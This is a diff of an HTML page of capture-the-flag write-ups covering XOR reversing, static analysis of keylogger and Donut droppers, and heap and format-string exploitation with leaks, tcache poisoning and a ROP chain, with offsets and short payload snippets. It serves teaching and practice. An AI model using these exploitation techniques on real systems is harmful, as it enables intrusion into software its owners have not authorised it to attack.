                 <p>The check requires exactly 0x24 bytes. At each position it compares (input[i] ^ 0x4d) ^ i ^ state with target[i], then replaces state with input[i].</p>
+
                 <p class="code-language">bash</p>
                 <pre><code>upx -d Varsity_Lake_Sonata.bin -o unpacked.bin</code></pre>
                 <p class="code-language">c</p>
@@ -931,6 +991,7 @@ for (i = 0; i &lt; 36; i++) {
               <li class="solve-step"><h4>Reverse the chained XOR</h4>
                 <p>XOR is reversible, so I iterated over the target bytes with the same state progression and solved input[i] = target[i] ^ i ^ state ^ 0x4d. Updating state with the recovered character yields the next character.</p>
                 <p>The recovered 36-byte string satisfied the check and was the flag.</p>
+
                 <p class="code-language">python</p>
                 <pre><code>state = 0x13
 flag = &quot;&quot;
@@ -959,6 +1020,7 @@ print(flag)</code></pre>
               <ol>
               <li class="solve-step"><h4>Identify the SFX dropper</h4>
                 <p>The challenge page warns that the file should be analysed in a virtual machine. Static inspection showed the SFX configuration runs chilllll.mp4 as a decoy and WinSystemUpdate.exe as the actual payload.</p>
+
                 <p class="code-language">text</p>
                 <pre><code>Setup=chilllll.mp4
 Setup=WinSystemUpdate.exe
@@ -970,6 +1032,7 @@ Overwrite=1</code></pre>
               </li>
               <li class="solve-step"><h4>Extract the nested PyInstaller payload</h4>
                 <p>I extracted the WinRAR SFX archive, then used pyinstxtractor on WinSystemUpdate.exe. Searching the extracted contents found keylog.pyc, confirming the Python malware stage.</p>
+
                 <p class="code-language">bash</p>
                 <pre><code>7z x VideoLauncher.exe -osfx_out
 cd sfx_out
@@ -981,6 +1044,7 @@ find WinSystemUpdate.exe_extracted -iname &#x27;*keylog*&#x27;</code></pre>
               <li class="solve-step"><h4>Recover the flag safely</h4>
                 <p>The extracted configuration used Fernet and contained Telegram delivery details. Those details included a real token and personal chat identifiers, so they are not reproduced in the page or download.</p>
                 <p>The team write-up&#x27;s recovery workflow forwards the attacker-chat history in an authorised CTF setting and searches each response for the UMCS format. The sanitised downloadable script preserves that logic but replaces credentials with placeholders.</p>
+
 
 
 
@@ -1004,12 +1068,14 @@ find WinSystemUpdate.exe_extracted -iname &#x27;*keylog*&#x27;</code></pre>
               <li class="solve-step"><h4>Identify the Donut instance</h4>
                 <p>I inspected .data and found the call opcode E8 followed by the instance length 0x21ebd. The bytes immediately after the call are the encrypted Donut instance, and the remaining bytes are loader code.</p>
 
+
                 <figure><img class="writeup-figure" src="../assets/writeups/umcs/donut-calculator-1.webp" alt="Donut Calculator challenge page" loading="lazy"><figcaption>The calculator download is the host PE whose .data section contains the Donut instance.</figcaption></figure>
 
               </li>
               <li class="solve-step"><h4>Decrypt and carve the embedded PE</h4>
                 <p>The instance provides a Chaskey CTR key and counter. I used them to decrypt the encrypted portion, then searched the plaintext for an MZ header and carved the embedded PE beginning at decrypted_instance + 0x1288.</p>
                 <p>This avoids executing either stage and preserves a reproducible static workflow.</p>
+
                 <p class="code-language">text</p>
                 <pre><code>key = 73df88ba8ce5b69ff9f323069cb98bea
 ctr = fe3417202e0d886883d730b5edcea2da</code></pre>
@@ -1019,6 +1085,7 @@ ctr = fe3417202e0d886883d730b5edcea2da</code></pre>
               <li class="solve-step"><h4>Recover and join both flag components</h4>
                 <p>The embedded PE’s nice() routine exposes nPcSeCreT and nPcF1aG. XORing the data with the first key reveals an encoded PowerShell command whose decoded text contains the first flag component; the second key reveals the suffix.</p>
                 <p>Joining those two strings produces the final flag.</p>
+
                 <p class="code-language">python</p>
                 <pre><code>key1 = b&#x27;nPcSeCreT&#x27;
 key2 = b&#x27;nPcF1aG&#x27;
@@ -1044,11 +1111,13 @@ key2 = b&#x27;nPcF1aG&#x27;
               <li class="solve-step"><h4>Map the outer dropper</h4>
                 <p>Static disassembly showed allocation, a copy from .rdata, RC4 decryption, and writing the result as a fake Startup updater. The source identifies the encrypted range as 0x5bcc00 bytes starting at file offset 0x82d0.</p>
 
+
                 <figure><img class="writeup-figure" src="../assets/writeups/umcs/horus-1.webp" alt="HORUS challenge page and malware-analysis warning" loading="lazy"><figcaption>HORUS is presented as real-malware analysis and is handled statically in the write-up.</figcaption></figure>
 
               </li>
               <li class="solve-step"><h4>Validate the inner key</h4>
                 <p>In YouAreAnIdiot-UnFlash, CliLoader checks the last six hexadecimal characters of the MD5 of its supplied key. The MD5 of bytes.fromhex(&#x27;deadbeefcafebabe&#x27;) matches the recorded expected MD5, linking the two layers.</p>
+
                 <p class="code-language">python</p>
                 <pre><code>key = bytes.fromhex(&#x27;deadbeefcafebabe&#x27;)
 assert hashlib.md5(key).hexdigest() == &#x27;c1a708f3e14e36e388ec2f75d04ceff2&#x27;</code></pre>
@@ -1057,6 +1126,7 @@ assert hashlib.md5(key).hexdigest() == &#x27;c1a708f3e14e36e388ec2f75d04ceff2&#x
               </li>
               <li class="solve-step"><h4>Decrypt cipherHex with RC4</h4>
                 <p>I used the same RC4 routine on CliLoader&#x27;s cipherHex value. The sanitised full helper is provided as a download and prints the recovered flag without executing the dropper.</p>
+
 
 
 
@@ -1084,6 +1154,7 @@ assert hashlib.md5(key).hexdigest() == &#x27;c1a708f3e14e36e388ec2f75d04ceff2&#x
               <ol>
               <li class="solve-step"><h4>Recon the stripped ELF and struct layout</h4>
                 <p>I confirmed the ELF properties, then searched the disassembly around system@plt and the shelf-print call. The print routine calls box-&gt;print_desc(box), so a controllable pointer at box+0 would control execution.</p>
+
                 <p class="code-language">bash</p>
                 <pre><code>file blindbox
 objdump -d blindbox | grep -B 5 &#x27;system@plt&#x27;
@@ -1093,6 +1164,7 @@ objdump -d -M intel blindbox | grep -A20 &#x27;4016f6&#x27;</code></pre>
               </li>
               <li class="solve-step"><h4>Exercise the UAF and double free</h4>
                 <p>I drew a box in slot 0, discarded it without clearing shelf[0], then reviewed the dangling object to corrupt its tcache key. A second discard passes the tcache double-free check and two subsequent draws alias the same chunk.</p>
+
                 <p class="code-language">python</p>
                 <pre><code>draw(io)
 discard(io, 0)
@@ -1106,6 +1178,7 @@ draw(io)</code></pre>
               <li class="solve-step"><h4>Test the function-pointer overwrite</h4>
                 <p>I attempted the ret2win overwrite with secret_grant at the start of the reviewed chunk, then displayed the shelf. The captured run prints secret_grant and print_desc addresses and returns the flag.</p>
                 <p>The source also notes a version-specific caveat: on the uploaded binary review begins at box+8, so a direct write does not change print_desc at box+0. That observation is retained because it explains the exploit discrepancy.</p>
+
 
                 <figure><img class="writeup-figure" src="../assets/writeups/umcs/cyber-blindbox-2.webp" alt="Sanitised Cyber BlindBox solver output showing function addresses and flag" loading="lazy"><figcaption>The solver run displays the relevant function addresses and the returned flag; the original local prompt was cropped out.</figcaption></figure>
 
@@ -1129,11 +1202,13 @@ draw(io)</code></pre>
               <li class="solve-step"><h4>Map the two vulnerabilities</h4>
                 <p>The challenge page frames the task as synchronising a shifting target. Disassembly showed printf receives the first 0x70-byte input directly, while a later fgets reads 0x100 bytes into a 0x80-byte buffer.</p>
 
+
                 <figure><img class="writeup-figure" src="../assets/writeups/umcs/black-flash-1.webp" alt="Black Flash challenge page" loading="lazy"><figcaption>The challenge page introduces the PIE- and canary-protected target.</figcaption></figure>
 
               </li>
               <li class="solve-step"><h4>Leak the canary and PIE address</h4>
                 <p>I sent %p. repeatedly and parsed the returned stack words. Offset 21 gives the canary; offset 23 is main&#x27;s return address, so pie_base = leaked_address - 0x1548 and win = pie_base + 0x1261.</p>
+
                 <p class="code-language">text</p>
                 <pre><code>%p.  # repeated 25 times
 PIE base = leaked_main_return - 0x1548
@@ -1143,6 +1218,7 @@ win = PIE base + 0x1261</code></pre>
               </li>
               <li class="solve-step"><h4>Overflow while preserving the canary</h4>
                 <p>The final payload uses 0x78 bytes of padding, the leaked eight-byte canary, eight junk bytes for saved RBP, and the calculated win address for RIP. The full team script is available with its remote target replaced by a placeholder.</p>
+
 
 
 
@@ -1166,11 +1242,13 @@ win = PIE base + 0x1261</code></pre>
               <li class="solve-step"><h4>Identify the indirect call</h4>
                 <p>The program stores void (*song)() = sing_oiia and calls song() after printf. Redirecting that pointer to win() avoids needing a return-address overwrite.</p>
 
+
                 <figure><img class="writeup-figure" src="../assets/writeups/umcs/spinning-cat-1.webp" alt="Spinning Cat challenge page and downloadable runtime files" loading="lazy"><figcaption>The challenge provides the PIE binary and its matching libc and loader.</figcaption></figure>
 
               </li>
               <li class="solve-step"><h4>Derive PIE and function-pointer addresses</h4>
                 <p>I leaked sing_oiia with %7$p and the stack reference with %42$p. The source gives pie = sing - 0x12ee, win = pie + 0x1251, and fp_slot = leak42 - 0x138.</p>
+
                 <p class="code-language">text</p>
                 <pre><code>%7$p.%42$p
 pie = leaked_sing_oiia - 0x12ee
@@ -1181,6 +1259,7 @@ fp_slot = leak42 - 0x138</code></pre>
               </li>
               <li class="solve-step"><h4>Partially overwrite song with %hn</h4>
                 <p>Because sing_oiia and win are close inside the same PIE mapping, only the low two bytes change: 0x12ee to 0x1251. I built a %hn payload that writes win &amp; 0xffff to fp_slot; when printf returns, song() calls win().</p>
+
                 <p class="code-language">python</p>
                 <pre><code>payload = build_hn_payload(fp_slot, win &amp; 0xffff, argpos=16)
 io.send(payload)</code></pre>
@@ -1205,6 +1284,7 @@ io.send(payload)</code></pre>
               <li class="solve-step"><h4>Plan leaks around the heap protections</h4>
                 <p>I used a 0x500 allocation and free to leak main_arena from the unsorted bin, then freed a tcache-sized chunk to recover its safe-linking key. Tcache poisoning then allocates over libc.environ to leak a stack address.</p>
 
+
                 <figure><img class="writeup-figure" src="../assets/writeups/umcs/retinascan-1.webp" alt="RetinaScan challenge page" loading="lazy"><figcaption>The challenge identifies seccomp and GLIBC 2.35 as central constraints.</figcaption></figure>
 
               </li>
@@ -1212,12 +1292,14 @@ io.send(payload)</code></pre>
                 <p>The source found the remote saved-RIP offset at 0x120. I poisoned a 0x400 tcache entry onto the stack, wrote the ROP chain, and enabled the sensor.</p>
                 <p>Before attempting open(), the chain writes ROP_OK! to stdout. The captured execution shows the libc and environ leaks followed by that marker, proving the stack overwrite and RIP control worked.</p>
 
+
                 <figure><img class="writeup-figure" src="../assets/writeups/umcs/retinascan-2.webp" alt="Sanitised RetinaScan exploit output showing leaks and ROP_OK marker" loading="lazy"><figcaption>The ROP_OK marker confirms that the staged chain reaches controlled execution before file access.</figcaption></figure>
 
               </li>
               <li class="solve-step"><h4>Fix the remote short read with a staged path</h4>
                 <p>The first ROP layout placed the pathname late in the initial edit payload. Remote edit() truncated that tail, so open() received garbage even though ROP_OK! printed.</p>
                 <p>I changed the chain to call read(0, path_buf, 0x80) after the marker, then issue raw SYS_open, move the returned file descriptor with xchg edi, eax; ret, and read/write the file. This avoids assuming fd 3.</p>
+
                 <p class="code-language">text</p>
                 <pre><code>write(1, &quot;ROP_OK!\n&quot;, 8)
 read(0, path_buf, 0x80)
@@ -1231,6 +1313,7 @@ write(1, out_buf, 0x200)</code></pre>
               <li class="solve-step"><h4>Use the filesystem delta and retrieve the flag</h4>
                 <p>I first requested /proc/self/environ through the staged read and learned the process working directory. That showed /flag.txt was wrong; the final retry sends the relative path flag.txt.</p>
                 <p>The final captured run shows the marker, the staged path, and the recovered flag. Local terminal prompts were removed from the published image.</p>
+
 
                 <figure><img class="writeup-figure" src="../assets/writeups/umcs/retinascan-3.webp" alt="Sanitised RetinaScan final exploit output showing ROP marker and flag" loading="lazy"><figcaption>The final staged run sends flag.txt after ROP_OK and prints the flag.</figcaption></figure>
 
